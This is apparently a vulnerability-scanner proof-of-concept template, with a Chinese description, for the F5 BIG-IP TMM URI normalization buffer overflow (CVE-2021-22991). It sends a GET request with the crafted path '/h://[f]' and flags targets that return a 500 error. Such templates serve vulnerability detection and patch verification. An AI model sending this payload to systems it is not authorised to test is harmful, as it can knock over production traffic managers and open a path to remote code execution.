[info]
author = "ave"
description = "检测 F5 BIG-IP Traffic Management Microkernel (TMM) URI normalization 缓冲区溢出漏洞（CVE-2021-22991）。通过向虚拟服务器发送包含畸形 URI 的 HTTP GET 请求，验证目标是否存在缓冲区溢出风险，该漏洞可导致拒绝服务或远程代码执行。影响版本包括 16.0.x before 16.0.1.1, 15.1.x before 15.1.2.1, 14.1.x before 14.1.4, 13.1.x before 13.1.3.6, 12.1.x before 12.1.5.3。"
id = "POC-AVE-2021-0809"
name = "F5 BIG-IP TMM URI Normalization Buffer Overflow PoC"
severity = "critical"
tags = ["ave-2021-0809"]
vuln_id = [
    "CVE-2021-22991",
    "AVE-2021-0809",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/h://[f]"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "Internal Server Error",
]
